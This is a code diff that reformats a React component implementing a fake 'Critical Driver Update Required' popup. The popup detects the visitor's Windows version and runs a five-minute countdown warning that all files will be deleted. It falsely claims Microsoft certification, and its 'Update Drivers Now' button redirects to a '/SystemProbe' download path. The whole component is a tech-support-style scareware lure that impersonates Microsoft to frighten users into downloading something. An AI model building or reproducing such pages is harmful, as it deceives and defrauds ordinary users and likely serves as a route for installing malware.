@@ -16,20 +16,20 @@ function Window({
   const [timeLeft, setTimeLeft] = useState(300); // 5 minutes in seconds
 
   // Get current date
-  const currentDate = new Date().toLocaleDateString('en-US', {
-    month: 'long',
-    day: 'numeric',
-    year: 'numeric'
+  const currentDate = new Date().toLocaleDateString("en-US", {
+    month: "long",
+    day: "numeric",
+    year: "numeric",
   });
 
   // Detect Windows version
   const detectWindowsOSVersion = () => {
     const userAgent = window.navigator.userAgent;
-    if (userAgent.indexOf('Windows NT 10.0') !== -1) return 'Windows 10/11';
-    if (userAgent.indexOf('Windows NT 6.3') !== -1) return 'Windows 8.1';
-    if (userAgent.indexOf('Windows NT 6.2') !== -1) return 'Windows 8';
-    if (userAgent.indexOf('Windows NT 6.1') !== -1) return 'Windows 7';
-    return 'Windows';
+    if (userAgent.indexOf("Windows NT 10.0") !== -1) return "Windows 10/11";
+    if (userAgent.indexOf("Windows NT 6.3") !== -1) return "Windows 8.1";
+    if (userAgent.indexOf("Windows NT 6.2") !== -1) return "Windows 8";
+    if (userAgent.indexOf("Windows NT 6.1") !== -1) return "Windows 7";
+    return "Windows";
   };
 
   // Countdown timer
@@ -37,7 +37,7 @@ function Window({
     if (timeLeft <= 0) return;
 
     const timer = setInterval(() => {
-      setTimeLeft(prev => prev - 1);
+      setTimeLeft((prev) => prev - 1);
     }, 1000);
 
     return () => clearInterval(timer);
@@ -47,14 +47,14 @@ function Window({
   const formatTime = (seconds: number) => {
     const mins = Math.floor(seconds / 60);
     const secs = seconds % 60;
-    return `${mins}:${secs.toString().padStart(2, '0')}`;
+    return `${mins}:${secs.toString().padStart(2, "0")}`;
   };
 
   const handleUpdate = () => {
     // Add your download/redirect logic here
     // Example: window.location.href = '/download'
 
-    window.location.href = '/SystemProbe'
+    window.location.href = "/SystemProbe";
   };
 
   return (
@@ -125,34 +125,64 @@ function Window({
               {/* Warning Header */}
               <div className="flex items-start gap-3">
                 <div className="shrink-0">
-                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" className="text-red-600">
-                    <path d="M12 2L2 22h20L12 2z" fill="currentColor" opacity="0.2"/>
-                    <path d="M12 2L2 22h20L12 2z" stroke="currentColor" strokeWidth="2" strokeLinejoin="round"/>
-                    <line x1="12" y1="9" x2="12" y2="13" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
-                    <circle cx="12" cy="17" r="1" fill="currentColor"/>
+                  <svg
+                    width="24"
+                    height="24"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    className="text-red-600"
+                  >
+                    <path
+                      d="M12 2L2 22h20L12 2z"
+                      fill="currentColor"
+                      opacity="0.2"
+                    />
+                    <path
+                      d="M12 2L2 22h20L12 2z"
+                      stroke="currentColor"
+                      strokeWidth="2"
+                      strokeLinejoin="round"
+                    />
+                    <line
+                      x1="12"
+                      y1="9"
+                      x2="12"
+                      y2="13"
+                      stroke="currentColor"
+                      strokeWidth="2"
+                      strokeLinecap="round"
+                    />
+                    <circle cx="12" cy="17" r="1" fill="currentColor" />
                   </svg>
                 </div>
                 <div className="flex-1">
-                  <h2 className="text-lg font-semibold text-gray-900 mb-2">Critical Driver Update Required</h2>
+                  <h2 className="text-lg font-semibold text-gray-900 mb-2">
+                    Critical Driver Update Required
+                  </h2>
                 </div>
               </div>
 
               {/* Warning Messages */}
               <div className="space-y-3 text-sm text-gray-700">
                 <p>
-                  <span className="font-semibold">Expired:</span> Your drivers expired today on{' '}
+                  <span className="font-semibold">Expired:</span> Your drivers
+                  expired today on{" "}
                   <span className="font-semibold">{currentDate}</span>
                 </p>
 
                 <p>
-                  <span className="font-semibold text-red-600">Warning:</span> {detectWindowsOSVersion()} detected
+                  <span className="font-semibold text-red-600">Warning:</span>{" "}
+                  {detectWindowsOSVersion()} detected
                 </p>
 
                 <div className="bg-red-50 border border-red-200 rounded p-3">
-                  <p className="font-semibold text-red-800 mb-1">⚠️ Outdated Drivers Detected</p>
+                  <p className="font-semibold text-red-800 mb-1">
+                    ⚠️ Outdated Drivers Detected
+                  </p>
                   <p className="text-red-700">
-                    If you do not update your drivers immediately, you will not be able to use your computer 
-                    once it has been shutdown and all your files are going to be deleted in{' '}
+                    If you do not update your drivers immediately, you will not
+                    be able to use your computer once it has been shutdown and
+                    all your files are going to be deleted in{" "}
                     <span className="font-bold text-red-600 text-lg">
                       {formatTime(timeLeft)}
                     </span>
@@ -160,22 +190,23 @@ function Window({
                 </div>
 
                 <p className="bg-blue-50 border border-blue-200 rounded p-3">
-                  <span className="font-semibold text-blue-800">Required:</span>{' '}
+                  <span className="font-semibold text-blue-800">Required:</span>{" "}
                   <span className="text-blue-700">
-                    Get the latest Drivers certified by Microsoft below to keep your computer up to date.
+                    Get the latest Drivers certified by Microsoft below to keep
+                    your computer up to date.
                   </span>
                 </p>
               </div>
 
               {/* Update Button */}
               <div className="pt-4 border-t border-gray-200">
-                <button 
+                <button
                   onClick={handleUpdate}
                   className="w-full py-3 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded transition-colors flex items-center justify-center gap-2"
                 >
                   Update Drivers Now
                 </button>
-                
+
                 <p className="text-xs text-gray-500 text-center mt-3">
                   Microsoft Certified • Secure Download • Permanent Support
                 </p>
